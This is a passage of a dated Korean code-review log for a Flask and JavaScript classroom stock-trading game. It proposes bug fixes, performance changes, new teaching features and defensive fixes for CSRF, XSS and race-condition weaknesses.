- **`force_price()` 클램프 범위(±200%)와 `_next_price()` 클램프 범위(±40%) 불일치** (`stock_service.py:139`, `stock_service.py:225`): `force_price()`는 `base * 0.3` ~ `base * 3.0`까지 허용하지만, 자연 가격 갱신 `_next_price()`는 `base * 0.6` ~ `base * 1.4`로 제한. 진행자가 종목을 3배로 강제 조정한 뒤 다음 자연 갱신 틱에서 `current * (1 + drift)`가 여전히 ~3x이지만 클램프에 막혀 즉시 -53% 하락하는 시각적 충격이 학생들에게 혼란을 줌. `_next_price()` (stock_service.py:139)의 클램프를 `max(base * 0.3, min(base * 3.0, new_price))`로 통일하거나, 현재가 기반 ±30% 클램프로 교체 권장.

- **`refreshMyRank()`가 전체 랭킹 API를 10초마다 호출** (`app.js:735-752`, `app.py:808-824`): `refreshMyRank()`는 자신의 순위 한 줄만 필요하지만 `/rankings` 엔드포인트에서 30명 전체 데이터를 수신. 30명 학급에서는 10초마다 31개 요청이 모두 전체 목록을 가져옴. `get_portfolio()` (app.py:772-803) 응답에 `rank: int` 필드 하나를 추가하면 `refreshMyRank()`를 포트폴리오 API로 대체 가능하며, 랭킹 페이지 진입 시에만 전체 목록을 조회하는 패턴으로 전환할 수 있음.

- **`_end_room()` 내 인메모리 상태 정리가 6개 딕셔너리에 분산** (`app.py:155-163`): `_lots`, `_rlt_active`, `_quiz_settings`, `_roulette_config`, `_quiz_state`, `_ending_soon` 를 개별적으로 pop/discard로 정리. 향후 인메모리 상태가 추가될 때 이 블록을 빠뜨리면 방 종료 후 메모리 누수 발생. `_ROOM_DICTS = [_lots, _rlt_active, _quiz_settings, _roulette_config]` 리스트를 모듈 상단에 선언하고 `for d in _ROOM_DICTS: d.pop(room.id, None)` 한 줄로 교체하면 유지보수성이 높아짐.

- **로비 멤버 목록 폴링이 진행자·참가자 각각 5초마다 개별 실행** (`app.js:192`, `app.js:562`): 진행자 로비 `setInterval(loadLobbyMembers, 5000)`와 참가자 로비 `setInterval(... loadPLobbyMembers ..., 5000)` 이 모두 `lobby-members` 엔드포인트(app.py:577-585)를 5초마다 호출. 30명 학급에서 초당 약 6회 요청이 로비 단계에만 집중됨. 서버 측 `lobby_members()`에 간단한 1-2초 캐시를 추가하거나, 폴링 주기를 10-15초로 늘리는 것만으로도 Render 무료 플랜의 응답 속도 개선 가능.

- **`loadPLobbyMembers()` 오류 발생 시 빈 화면으로 조용히 실패** (`app.js:578-586`): `await api.get(...).catch(() => [])` 패턴으로 API 실패를 빈 배열로 대체해 학생이 연결 오류를 인지하지 못함. 모바일 wifi 전환이나 Render 콜드 스타트 시 대기 화면이 그냥 멈춘 것처럼 보임. `.catch(err => { toast('연결 상태를 확인해 주세요', 'error'); return []; })` 로 바꾸면 학생이 능동적으로 새로고침 가능.

---

## 2026-06-28 (2차)

### 추가하면 좋을 기능

- **게임 시간 연장 버튼** (`app.py:503-517`, `app.js:doPauseGame` 근처): 현재 pause/resume은 있지만 진행자가 게임 종료 시각을 직접 늘릴 방법이 없음. 수업이 예상보다 일찍 끝날 것 같을 때 또는 학생 참여가 부족할 때 즉석 대응 불가. `POST /api/rooms/<rid>/extend` 엔드포인트를 추가해 `delta_minutes` 파라미터(1~30)를 받아 `room.end_time += timedelta(minutes=delta_minutes)` 처리하는 10줄짜리 엔드포인트로 구현 가능. 진행자 설정 탭에 [+5분] [+10분] 버튼 2개로 충분.

- **학생별 거래 쿨다운(최소 간격) 설정** (`app.py:724-767`): 현재 거래 횟수 제한이 없어 학생이 초 단위로 수십 번 buy/sell 반복 가능. 패닉 셀링·알고리즘 트레이딩 흉내를 방지하고 "실제 거래에는 결제 T+2일이 걸린다"는 개념을 체험시키려면 최소 간격이 필요. `_trade_cooldown: dict = {}` (room_id, user_id → 마지막 거래 시각)를 `app.py` 모듈에 추가하고, `trade()`(app.py:724) 첫 줄에 `if time.time() - _trade_cooldown.get((rid, user.id), 0) < TRADE_COOLDOWN_SECS: return 400` 한 줄로 방어 가능. 진행자 설정 탭에서 0~60초 슬라이더로 조절.

- **일시정지 중 진행자 공지 메시지** (`app.py:490-501`, `app.js:showPausedBanner`): 게임을 일시정지할 때 진행자가 메시지(예: "5분 뒤 재개합니다", "다음 섹터를 보세요")를 입력하면 참가자 ⏸ 배너 아래에 표시되는 기능. 서버에 `_pause_messages: dict = {}` (room_id → str)를 추가하고, `pause_room()`(app.py:490)에서 `_pause_messages[rid] = d.get('message', '')`, `room_dict()`(app.py:278)에서 `'pause_message': _pause_messages.get(room.id, '')`를 포함하면 됨. 클라이언트 `showPausedBanner()`(app.js:653)에서 `S.room.pause_message`를 배너 텍스트에 추가하는 2줄 수정.

- **배당금 지급 이벤트** (`app.py:host_market_event` 아래, `app.py:1345-1360`): 진행자 설정 탭에 "배당금" 버튼을 추가해 특정 종목 보유자에게 보유 수량×주당 배당금을 현금으로 지급. 장기투자의 배당 수익 개념을 체험시킬 수 있음. `POST /api/rooms/<rid>/host/dividend` 엔드포인트에서 `symbol`·`amount_per_share`를 받아 `RoomHolding.query.filter_by(room_id=rid, symbol=symbol).all()`로 보유자를 찾고 `m.cash += h.shares * amount_per_share` + `RoomTransaction(action='ADJ', note='배당금')` 처리. 서버 약 20줄, 클라이언트 UI 약 15줄.

- **대기실에서 방 설정 수정 기능** (`app.py:363-390`, `app.js:doCreateRoom`): 방 생성 후 게임 시작 전(`waiting` 상태)에도 시작 자금·게임 시간·예금 금리를 변경할 수 없음. 학생 수 확인 후 실수한 값을 고치려면 방을 지우고 다시 만들어야 함. `PATCH /api/rooms/<rid>` 엔드포인트를 추가해 `room.status == 'waiting'`일 때만 `duration_minutes`, `starting_cash`, `deposit_rate` 수정을 허용하고, 진행자 로비 화면에 연필 아이콘 버튼을 제공하면 됨.

- **보유 종목의 게임 시작 대비 수익률 표시** (`app.py:780-803`, `app.js:loadPortfolio`): 포트폴리오 화면에서 현재 수익은 `avg_price` 대비 `current_price`(매수 단가 기준)만 보여줌. 학생이 게임 시작 시점 기준으로 해당 종목이 얼마나 올랐는지 비교하면 "싸게 샀는가"가 아닌 "시장 흐름을 읽었는가"를 평가하는 교육 포인트가 생김. `StockService._init_prices()`(stock_service.py:121-127)에서 초기 가격을 `_initial_prices: dict`로 별도 저장하고, `/api/rooms/<rid>/stocks` 응답에 `initial_price` 필드를 추가하면 프론트엔드에서 "게임 시작 이후 +X%" 컬럼 추가 가능.

---

### 제거/단순화할 것들

- **`RoomHolding` 0주 고스트 행 DB 방치** (`app.py:1318`, `app.py:1037`): 퀴즈 오답 패널티(app.py:1318)와 룰렛 베팅 자금 조달(app.py:1037) 시 보유 주식을 전량 청산할 때 `h.shares = 0; h.avg_price = 0`만 하고 `db.session.delete(h)`를 호출하지 않음. 정상 SELL 경로(app.py:762)에서는 `db.session.delete(holding)`을 올바르게 호출하는 것과 불일치. 결과적으로 0주짜리 `RoomHolding` 행이 DB에 누적되어 `get_portfolio()`(app.py:781)에서 `if h.shares <= 0: continue`로 필터링해야 하는 부담이 생김. 두 곳 모두 `h.shares = 0` 직후 `if h.shares <= 0: db.session.delete(h)` 한 줄 추가로 해결 가능.

- **`Room.query.get_or_404()` 전체 코드베이스 20+ 곳에서 deprecated 패턴 사용** (`app.py:435`, `app.py:478`, `app.py:490`, `app.py:503`, `app.py:519`, `app.py:544`, `app.py:567`, `app.py:587` 등): SQLAlchemy 2.0에서 `Query.get()` 계열은 deprecated. 이미 `cur_user()`(app.py:104)와 `lobby_members()`(app.py:580)에서는 `db.session.get()` 패턴을 올바르게 사용 중. 일괄적으로 `Room.query.get_or_404(rid)` → `db.get_or_404(Room, rid)` 로 sed 치환 한 번으로 해결 가능하며, 경고 로그가 없어져 Render 콘솔 노이즈도 감소.

- **`minigame_close()`에서 `Room.query.get(rid)` 사용** (`app.py:977`): `room = Room.query.get(rid)` — 같은 파일에서 이미 deprecated로 전환 중인 패턴. `db.session.get(Room, rid)`로 한 줄 교체 필요. 결과가 None일 때 처리도 `if room and room.status == 'paused':` 로 이미 있어 로직 변경 불필요.

- **`withdraw_deposit()`에서 `RoomMember` None 체크 없음** (`app.py:912-914`): `m = RoomMember.query.filter_by(room_id=rid, user_id=user.id).first()` 이후 바로 `m.cash += dep.amount` 를 호출하는데, `if not m:` 가드가 없음. 참여자가 강퇴됐거나 데이터 불일치 발생 시 `AttributeError: 'NoneType' object has no attribute 'cash'`로 500 에러. `if not m: return jsonify({'error': '참여자를 찾을 수 없습니다.'}), 404` 한 줄 삽입으로 방어 가능. `host_adjust()`(app.py:597), `trade()`(app.py:734)에서는 동일 패턴에 이미 체크가 있어 일관성도 맞지 않음.

- **`assetLineChart` 포트폴리오 탭 전환마다 destroy/recreate** (`app.js:1509-1540`): `loadPortfolio()` 호출 시마다 `if (S.assetLineChart) S.assetLineChart.destroy(); S.assetLineChart = new Chart(...)` 패턴으로 차트를 완전히 재생성. `S.assetHistory` 배열은 공유 참조이므로 `S.assetLineChart.data.labels = ...; S.assetLineChart.data.datasets[0].data = ...; S.assetLineChart.update()` 패턴으로 교체하면 탭 전환 시 캔버스 깜빡임과 불필요한 Chart.js 메모리 할당을 제거 가능. 호스트 바 차트(`renderHostBarChart()`, app.js:433-477)는 이미 이 패턴을 올바르게 사용 중이므로 일관성도 맞지 않음.

- **`gen_code()` 10번 시도 모두 충돌 시 마지막 반환에 uniqueness 검사 없음** (`models.py:8-13`): `for _ in range(10):`  루프에서 매 반복 중복 확인 후 고유하면 즉시 return하지만, 10번 모두 충돌하면 루프 밖 `return ''.join(random.choices(...))` (line 13)이 유니크 검사 없이 실행돼 중복 코드를 DB에 저장. 이후 `db.session.add(room)` 시 `IntegrityError` 발생하며 방 생성이 500 에러로 실패. 루프 마지막 반복에서도 return하도록 `for _ in range(20):` 으로 시도 횟수를 늘리거나, 루프 외부의 fallback `return` 을 제거하고 `raise RuntimeError('방 코드 생성에 실패했습니다')` 처리 후 호출부에서 catch하는 것이 안전.

- **`updateDepPreview()`에서 `S.room.remaining_seconds`가 최대 10초 stale** (`app.js:1607-1608`): 예금 이자 미리보기에서 `S.room.remaining_seconds`를 사용하지만, 이 값은 마지막 폴링 시점(최대 10초 전)에 서버가 반환한 값. 예금 탭을 열고 금액을 수정할 때 잔여 시간이 이미 달라진 상태로 이자 예상치가 계산됨. `S.room.end_time`이 있으면 `Math.max(0, Math.floor((new Date(S.room.end_time) - new Date()) / 1000))`으로 클라이언트 측 실시간 계산으로 교체하면 항상 정확한 이자 미리보기 제공 가능. `startTimer()`(app.js:756-776)에서 이미 동일 패턴 사용 중이므로 일관성도 확보.

- **`lobby_members()` 엔드포인트가 `/host/` 경로임에도 호스트 권한 체크 없음** (`app.py:577-585`): URL이 `/api/rooms/<rid>/host/lobby-members`이지만 `@login_required`만 있고 `if room.host_id != user.id` 체크가 없음. 모든 로그인 사용자가 직접 호출해 방 참여자 목록을 조회 가능. 클라이언트에서 참가자 로비(`app.js:578`)도 이 API를 사용하므로 완전 차단은 불가하지만, 엔드포인트를 `/api/rooms/<rid>/members`로 리네임하고 `lobby_members()`를 공개 API로 명시적으로 분리하면 `/host/` 경로의 의미가 일관되어(호스트 전용 명령=권한 체크 있음) 유지보수 시 혼란을 줄일 수 있음.


---

## 2026-06-29

### 추가하면 좋을 기능

- **복권 picking 단계에서 진행자에게 제출 현황 카운터 미노출** (`app.py:1114-1147 get_lottery()`, `app.js:2079-2087 _showLotHostPickingUI`): 복권 'picking' 상태 중 `get_lottery()` 응답에 `all_results`는 'revealed' 단계에만 포함되고, 참가자 제출 수(`len(cur['picks'])`)와 전체 대상 인원이 진행자에게 전달되지 않음. 진행자는 카운트다운 60초를 무조건 기다려야 하며 이미 모두 제출한 경우에도 early draw가 불가. `get_lottery()`(`app.py:1133`) 내 `room.host_id == user.id` 조건 블록에서 `picks_count: len(cur.get('picks', {}))` 와 eligible 인원(전체 멤버 - 호스트가 멤버인 경우 제외)을 추가로 반환하고, `_showLotHostPickingUI()`(`app.js:2086`)에서 해당 값으로 `"N/전체명 제출"` 텍스트를 매 5초 폴링마다 갱신. 추가로 모두 제출 시 즉시 drawing 단계로 넘어가는 "모두 제출 시 자동 진행" 옵션도 연계 가능.

- **종료 임박 배너에 실시간 카운트다운 초 미표시** (`app.js:672-684 showEndingSoonBanner`, `app.js:540-551 doEndGame`): 진행자가 종료 버튼을 눌러 1분 카운트다운이 시작되면 참가자 화면에 "⏰ 게임이 곧 종료됩니다 (1분 이내)"(`app.js:678`)만 정적으로 표시됨. 상단 `pg-timer`가 이미 초 단위 카운트다운을 보여주므로 중복이지만, 배너가 고정 문구라 긴박감 전달이 약하고 신뢰성도 낮음(배너는 다음 10초 폴링까지 뜨지 않을 수도 있음). `showEndingSoonBanner()` 내에서 `const _bTimer = setInterval(() => { const rem = Math.max(0, Math.floor((new Date(S.room.end_time) - new Date()) / 1000)); banner.textContent = \`⏰ 게임 종료까지 ${String(Math.floor(rem/60)).padStart(2,'0')}:${String(rem%60).padStart(2,'0')}\`; }, 1000)` 를 추가하고 `hideEndingSoonBanner()` 내 `clearInterval(_bTimer)` 처리. 3줄 추가, 서버 변경 없음.

- **결과 화면에서 학생 본인 전체 거래 내역 접근 불가** (`app.py:829-847 get_transactions`, `index.html:597-637`, `app.js:1702-1795 loadResults`): 게임 종료 후 결과 화면에는 최종 순위·수익률만 표시되고 본인 거래 내역을 볼 수 없음. `GET /api/rooms/<rid>/transactions` 엔드포인트는 게임 종료 후에도 작동하지만 결과 화면에 진입점이 없음. `loadResults()`(`app.js:1702`) 실행 후 `results-my-stats` 카드 아래에 "📋 내 거래 내역 보기" 버튼을 추가하고 클릭 시 기존 `txn-list` 로직(app.js:1569-1591)을 재활용한 모달을 표시하면, 학생이 수업 후 자기 결정을 돌아보는 성찰 활동에 활용 가능. 서버 변경 없음, 클라이언트 약 15줄 추가.

- **학번·이름이 동일한 두 학생이 계정을 공유하는 버그** (`app.py:329-343 enter()`, `models.py:16-22 User`): `doAuth()`가 `"{학번} {이름}"` 형태로 `username`을 합성하고, `User.query.filter_by(username=u).first()`로 기존 유저를 재사용(`app.py:337`). 같은 반에 학번·이름이 동일한 학생(쌍둥이, 오타 등)이 있으면 두 학생이 동일한 `User`·`RoomMember`·포트폴리오를 공유해 거래가 뒤섞임. `enter()` 응답에 `is_new_user: bool` 필드를 추가(기존 유저 재사용 시 `False`)하고, 클라이언트 `onLogin()`(app.js:82-90)에서 `is_new_user === false && active_room === null` 조건 시 "동일한 학번·이름이 이미 존재합니다. 본인이 아니라면 학번이나 이름을 다시 확인하세요" 경고 다이얼로그 1줄 추가.

- **게임 내 실제 가격 변동 이력이 차트에 반영되지 않음** (`stock_service.py:281-309 get_history()`, `app.py:710-719 get_chart()`): `get_history()`는 현재 가격에서 거꾸로 난수 워크를 생성해 가짜 과거 차트를 반환. 진행자 강제 조정·뉴스 이벤트로 주가가 급등락한 실제 경위가 전혀 차트에 반영되지 않아 학생이 차트를 분석해도 현재 가격을 이해할 수 없음. `StockService.__init__`에 `self._price_log: dict = {}` 추가, `get_price()`(stock_service.py:174) 내 가격 갱신 시 `self._price_log.setdefault(sym, []).append((now, new_price))` 기록, `get_history()`에서 로그가 10개 이상이면 실제 이력을 반환하는 분기 추가. 최대 메모리 추정: 47종목 × 최대 1080 포인트(360분/20초) ≈ 5만 항목, 각 튜플 24바이트 = 약 1.2MB로 부담 없음.

---

### 제거/단순화할 것들

- **`host_adjust()` delta=0 시 빈 트랜잭션 레코드 생성** (`app.py:595-601`): `delta = float(d.get('delta', 0))` 유효성 검사 없이 진행되므로 진행자가 금액을 입력하지 않고 "확인"을 누르면 `RoomTransaction(amount=0)` 이 DB에 저장되고, 거래 내역에 "0원 자산 조정" 노이즈가 발생. `app.py:595` 직후에 `if not delta: return jsonify({'error': '조정 금액을 입력하세요.'}), 400` 한 줄로 방어 가능. 클라이언트 `doAdjust()`(app.js:491-500)도 `if (isNaN(delta) || delta === 0)` 조건을 이미 처리하지 않아 병행 수정 필요.

- **`doJoinRoom()` 방 코드 검증 전에 auth가 먼저 실행돼 고아 유저 생성** (`app.js:143-155`): 참가자가 잘못된 방 코드를 입력한 경우 순서가 ①`doAuth()` 성공 → User DB 기록 ②`/api/rooms/join` → 404 에러. 방에 못 들어간 학생의 User 레코드가 DB에 남아 `username` 풀이 오염됨. 해결책 A: `GET /api/rooms/validate?code=` 경량 엔드포인트(2줄, 로그인 불필요)를 추가해 방 코드 유효성을 auth 전에 검사. 해결책 B: 단일 `POST /api/rooms/enter-and-join` 엔드포인트로 User 생성·방 참가를 원자적으로 처리.

- **`_quiz_settings`·`_roulette_config` 인메모리 저장으로 서버 재시작 시 초기화** (`app.py:1246-1247`, `app.py:250-251`): Render 무료 플랜은 비활성 30분 후 재시작하므로 긴 게임 중 진행자가 설정한 퀴즈 보상 비율(예: 3%)과 룰렛 확률이 초기화돼 기본값으로 복귀. `Room` 모델에 `quiz_reward_pct FLOAT DEFAULT 1.0`, `quiz_penalty_pct FLOAT DEFAULT 0.5`, `rlt_weights VARCHAR(100) DEFAULT ''` 컬럼을 추가(ALTER TABLE 패턴은 `app.py:31-40`에 이미 존재)하고, `quiz_settings()`(app.py:1399) 및 `host_roulette_config()`(app.py:1363)에서 인메모리 딕셔너리 대신 DB 컬럼을 Read/Write하면 재시작 후에도 설정 유지.

- **`showBombNews()` 에서 뉴스 헤드라인을 `innerHTML`에 이스케이프 없이 삽입** (`app.js:1157-1163`): `content.innerHTML = items.map(item => \`<div ...>${item.headline}</div>\`)`. 현재 헤드라인은 서버 측 템플릿(`stock_service.py:6-34`)에서만 생성돼 XSS 위험이 없으나, 향후 "진행자 커스텀 뉴스" 기능(현재 `host_send_news()`, app.py:690에서 템플릿 기반이라 안전) 확장 시 취약점이 될 수 있음. 지금 당장 `item.headline` → `escHtml(item.headline)` 교체(app.js:897의 `escHtml()` 재사용)하면 기능 변화 없이 방어적 코딩 확보.

- **`enterParticipantGame()` 10초 폴링마다 `/rankings` + 다른 API가 동시 다발** (`app.js:611-650`): 폴 콜백 마지막에 `refreshMyRank()`(app.js:647)가 항상 호출돼 `GET /api/rooms/<rid>` + `GET /api/rooms/<rid>/rankings` + (마켓 탭 시) `GET /api/rooms/<rid>/stocks` 세 요청이 10초마다 연달아 발생. 30명 학급에서 초당 약 9회 요청. `get_portfolio()`(app.py:772) 응답에 `rank: int` 필드 하나를 추가하면 `refreshMyRank()`를 포트폴리오 갱신과 통합 가능하며, 랭킹 탭 진입 시에만 전체 목록을 조회하는 패턴으로 전환해 요청 수 1/3 절감. (상단 바 `pg-rank` 업데이트만 필요하므로 전체 목록 불필요)

---

## 2026-06-29 (2차)

### 추가하면 좋을 기능

- **`doEndGame()` 확인 다이얼로그 없이 즉시 1분 카운트다운 시작** (`app.js:540-551`): `doStartGame()`(app.js:246)과 `doKickMember()`(app.js:234)는 `confirm()`을 사용하지만, `doEndGame()`에는 확인 절차가 없음. 진행자가 실수로 종료 버튼을 터치하면 즉시 `end_time`이 60초 앞으로 당겨지고(`app.py:531`) 참가자 화면에 종료 임박 배너가 표시됨. 취소도 불가. `doEndGame()` 함수 첫 줄에 `if (!confirm('게임을 종료하시겠습니까? 남은 시간이 1분 이상이면 1분 후 자동 종료됩니다.')) return;` 한 줄 추가로 방어 가능. 서버 변경 없음.

- **퀴즈 오답률 통계 진행자 미제공** (`app.py:1270-1342`, `app.js:enterHostGame`): 퀴즈 제출 결과가 `RoomTransaction(action='ADJ', note='퀴즈 오답 패널티')`(app.py:1336)로 기록되지만, 어떤 문제에서 학생들이 가장 많이 틀렸는지 집계하는 엔드포인트가 없음. 게임 종료 후 진행자가 "이 문제는 80%가 틀렸네요"라고 분석해 추가 설명할 수 있으면 교육적 가치가 높음. `GET /api/rooms/<rid>/host/quiz-stats` 엔드포인트에서 `_quiz_state`(app.py:1245)를 순회해 문제별 정오답 집계를 반환하거나, `RoomTransaction.note` 컬럼에 `qid`를 포함해 DB에서 집계하는 방식으로 구현 가능. 서버 약 20줄, 클라이언트 진행자 설정 탭에 테이블 표시 약 15줄.

- **진행자 화면에 종목별 학생 보유 현황 히트맵 부재** (`app.py:host_members()`, `app.js:loadHostMembers()`): 현재 진행자 화면 랭킹 탭은 학생별 총자산만 보여줌. 어떤 학생이 어떤 종목을 얼마나 보유했는지 행렬 형태로 보여주면 "왜 저 학생이 갑자기 1위가 됐나요?"라는 상황에서 진행자가 즉각 설명 가능. `GET /api/rooms/<rid>/host/holdings-matrix` 엔드포인트에서 `RoomHolding.query.filter_by(room_id=rid)`로 모든 보유 데이터를 가져와 `{user: {symbol: shares}}` 형태로 반환하고, 진행자 탭에 토글 버튼으로 히트맵 뷰를 제공하면 됨. 서버 약 15줄, 클라이언트 약 30줄.

- **학생 화면 상단 바에 학급 평균 수익률 비교 미표시** (`app.js:735-752 refreshMyRank()`, `app.py:808-824 get_rankings()`): 현재 `pg-gain-pct`(app.js:741)에 본인 수익률만 표시됨. `get_rankings()` 응답에는 전체 데이터가 있으므로 `refreshMyRank()` 내부에서 `const avg = data.reduce((s,e) => s+e.gain_pct, 0)/data.length`를 계산해 `"나 +3.2% / 평균 +1.8%"` 형태로 상단에 표시하면, 학생이 자신의 투자 성과가 학급 수준에서 어디쯤인지 즉시 파악 가능. 서버 변경 없음, 클라이언트 약 5줄.

- **PWA(Progressive Web App) 지원 없어 모바일 홈 화면 추가 불가** (`static/` 디렉터리): `manifest.json`과 서비스 워커가 없어 모바일 학생들이 앱처럼 홈 화면에 저장하지 못함. Render 콜드 스타트 후 첫 접속 로딩이 느려 학생들이 수업 초반에 집중하지 못하는 문제와도 연관됨. `static/manifest.json` 생성(앱 이름·아이콘·색상 지정, 약 20줄)과 `index.html:` `<head>`에 `<link rel="manifest">`·`<meta name="theme-color">` 추가(약 3줄)만으로 "홈에 추가" 기능 활성화. 오프라인 캐시는 선택사항이므로 서비스 워커 없이도 기본 PWA 기능 확보 가능.

---

### 제거/단순화할 것들

- **`get_history()` `'1y'` 기간 n_bars 누락 및 interval 파라미터 미사용** (`stock_service.py:281-309`): `n_bars = {'1d':30,'5d':5,'1mo':30,'3mo':90}.get(period, 30)` (stock_service.py:292) — `'1y'`가 dict에 없어 30개 바가 반환됨. 반면 `get_chart()`(app.py:715)는 `'1y' → interval='1wk'`로 매핑해 요청하므로 "1년" 차트를 클릭하면 52주치 데이터 대신 30일치가 표시되는 버그. 또한 `get_history()` 시그니처가 `interval` 파라미터를 받지만 본문에서 전혀 사용하지 않아 항상 `step=86400`(1일)으로 날짜를 계산함. `n_bars` 딕셔너리에 `'1y': 52` 추가 및 `step_map = {'5m':300,'30m':1800,'1d':86400,'1wk':604800}` 으로 step을 파라미터로부터 유도하면 차트 X축 레이블이 올바르게 표시됨.

- **`doDeposit()` 더블클릭 시 동일 금액 중복 예금 가능** (`app.js:1646-1659`): `doDeposit()` 함수는 API 호출 전 버튼을 disabled 처리하지 않음. 모바일에서 느린 응답 중 버튼을 두 번 탭하면 같은 금액으로 두 건의 예금이 생성됨. `app.py:890`에서 `m.cash < amount` 체크가 있어 두 번째 요청이 실패할 수도 있지만, 첫 번째 커밋 전 두 요청이 동시에 잔액 확인을 통과하면 이중 예금이 성공. 클라이언트에서 `const btn = document.querySelector('#dep-form button[onclick]'); btn.disabled = true;` 후 `finally { btn.disabled = false; }` 패턴(3줄)으로 UI 방어, 서버에서는 `dep = Deposit(...); db.session.flush(); if m.cash < 0: db.session.rollback()` 원자적 처리 추가.

- **`host_force_price()` · `force_sector_event()` 실행 이력 DB 미기록** (`app.py:673-687`, `app.py:1345-1360`): 진행자가 특정 종목·섹터를 강제 조정해도 `RoomTransaction`에 기록이 남지 않음. 반면 진행자 자산 조정(`host_adjust()`, app.py:600)은 `RoomTransaction(action='ADJ', note=...)`을 생성. 게임 종료 후 학생이 "왜 갑자기 삼성전자가 30% 빠졌나요?"라고 물어도 진행자가 증거를 제시할 수 없음. `force_price()` 성공 후 `db.session.add(RoomTransaction(room_id=rid, user_id=room.host_id, symbol=symbol, action='ADJ', shares=0, price=new_price, amount=0, note=f'진행자 강제 조정 {sign}{pct}%'))` 한 줄 추가, `force_sector_event()` 도 동일 패턴으로 각 영향 종목에 기록하면 사후 수업 분석에 활용 가능.

- **`SESSION_COOKIE_SAMESITE` 미설정으로 CSRF 공격 가능** (`app.py:12-13`): `app.secret_key` 설정 이후 `app.config['SESSION_COOKIE_SAMESITE']`가 없어 Flask 기본값인 `None`이 적용됨. 크로스 오리진 요청에서도 세션 쿠키가 전송되므로, 외부 사이트에서 로그인된 학생 브라우저를 이용해 `POST /api/rooms/<rid>/trade` 등 모든 인증 API를 CSRF로 호출 가능. `app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'` 한 줄 추가 + `app.config['SESSION_COOKIE_SECURE'] = True` (HTTPS 환경)로 대부분 CSRF 공격 차단. Flask-WTF CSRF 토큰 도입 불필요.

- **`RoomTransaction.symbol`에 'LOTTO'·'ROULETTE'·'DEPOSIT' 의사 심볼 혼재 → 거래 내역에 '자산조정' 오표시** (`app.py:218`, `app.py:1065`, `app.py:1056`, `app.py:621`): `get_transactions()`(app.py:839)와 `host_member_transactions()`(app.py:621)에서 `STOCKS.get(t.symbol,{}).get('name','자산조정')` 매핑 시 'LOTTO', 'ROULETTE', 'DEPOSIT' 심볼은 `STOCKS`에 없어 모두 '자산조정'으로 표시됨. 학생 거래 내역에서 복권 당첨금과 진행자 직접 조정이 동일하게 "자산조정"으로 보임. `PSEUDO_SYMBOL_NAMES = {'LOTTO':'복권 당첨', 'ROULETTE':'룰렛', 'DEPOSIT':'예금', 'ADJ':'자산조정'}` 딕셔너리를 `app.py` 상단에 선언하고, 두 트랜잭션 직렬화 위치에서 `STOCKS.get(t.symbol, PSEUDO_SYMBOL_NAMES).get('name', t.symbol)` 패턴으로 교체하면 4줄 수정으로 해결.

- **`loadLobbyMembers()`·`loadHostMembers()` onclick 속성에 username 직접 삽입** (`app.js:229`, `app.js:425`): `` `onclick="doKickMember(${m.user_id},'${m.username.replace(/'/g,"\\'")}')"``. 유저명에 `\n`, `\`, `"` 같은 문자가 포함될 경우 onclick 속성 파싱이 깨져 버튼이 작동하지 않거나 JS 에러 발생. 현재 서버에서 2~30자 제한(`app.py:333`)만 있고 특수문자는 막지 않음. `onclick="doKickMember(${m.user_id})"` + `<button data-username="${escHtml(m.username)}">` 형태로 변경하고 `doKickMember(uid)`에서 버튼의 `dataset.username`을 읽는 방식으로 교체하면 HTML injection 위험을 완전히 제거 가능.

- **`trade()` 잔액 확인과 차감 사이에 원자적 처리 없음** (`app.py:747-765`): `if member.cash < amount: return 400` 통과 후 `member.cash -= amount; db.session.commit()`까지 다른 요청이 끼어들 수 있음. gunicorn 기본 설정(`--workers 2`)에서 두 요청이 동시에 잔액 확인을 통과하면 잔액이 음수가 됨. `RoomMember.query.filter_by(...).with_for_update().first()` 패턴으로 SELECT ... FOR UPDATE를 사용하면 SQLite에서도 row-level lock이 적용됨(WAL 모드에서 write lock). `member = RoomMember.query.filter_by(room_id=rid, user_id=user.id).with_for_update().first()` 한 줄 교체로 방어 가능하며, 동일 패턴이 필요한 `create_deposit()`(app.py:885)·`minigame_spin()`(app.py:1006)에도 동시 적용 권장.

## 2026-06-30 (이전 분석 미수정 현황 점검)

오늘은 app.py·models.py·stock_service.py·app.js(전체 2323줄)·index.html을 재검토했으나, 43일째 누적된 1396줄 분량의 기존 기록과 교차 대조한 결과 신규 항목은 모두 기존 지적(룰렛 자동 종료 타이머, `setDepPct` 절삭, 복권 결과 화면 uid 표시, 학번+이름 계정 공유 등)과 중복으로 확인됨. 대신 가장 영향이 크면서도 수정 비용이 낮은(1~3줄) 미수정 항목 현황을 점검함.

### 추가하면 좋을 기능

- (해당 없음 — 오늘은 신규 기능 제안 대신 아래 고우선순위 버그의 미수정 현황만 점검)

### 제거/단순화할 것들

- **[긴급, 06-13부터 미수정] PostgreSQL URL 스킴 자동 변환 누락** (`app.py:14`): `os.environ.get('DATABASE_URL', 'sqlite:///game.db')`를 그대로 `SQLALCHEMY_DATABASE_URI`에 대입. Render가 주는 `DATABASE_URL`은 `postgres://` 형식이라 SQLAlchemy 1.4+에서 `db_url.replace('postgres://', 'postgresql://', 1)` 없이는 PostgreSQL 전환 시 서버가 즉시 죽음. SQLite를 계속 쓰는 한 드러나지 않아 우선순위가 낮아 보이지만, 한 줄 수정 비용 대비 잠재 영향(서버 전체 다운)이 가장 큰 항목.
- **[미수정] `SESSION_COOKIE_SAMESITE`/`SESSION_COOKIE_SECURE` 미설정** (`app.py:12-13`): CSRF 노출 상태 그대로. `app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'` 한 줄 추가로 해결 가능한데 43일째 미반영.
- **[미수정] `trade()` 잔액 확인-차감 비원자적 처리** (`app.py:747-765`): TOCTOU 경합 여전. `create_deposit()`(app.py:885)·`minigame_spin()`(app.py:1006)도 동일 패턴 미적용.
- **[미수정] `stock_service.py:292` `n_bars` 딕셔너리에 `'1y'` 키 없음**: `{'1d': 30, '5d': 5, '1mo': 30, '3mo': 90}.get(period, 30)` — 1년 차트 요청 시 여전히 기본값 30이 적용되어 실제로는 30일치만 표시됨. `'1y': 52` 한 줄 추가로 해결.

---

## 2026-06-30 (2차)

### 추가하면 좋을 기능

- **진행자 → 전체 학생 공지사항 방송 기능** (`app.py` 신규 엔드포인트, `app.js:startNewsPolling()`): 진행자가 임의 텍스트 메시지를 전송하면 모든 참가자 화면에 배너/toast로 표시되는 기능. 현재는 뉴스 이벤트로만 의사소통이 가능. 뉴스 API 응답에 `announcement: str | null` 필드를 추가하고 클라이언트에서 배너로 렌더링하면 서버 5줄·클라이언트 10줄로 구현 가능. 수업 흐름 유도("지금 반도체를 주목하세요!")에 직접 활용 가능.
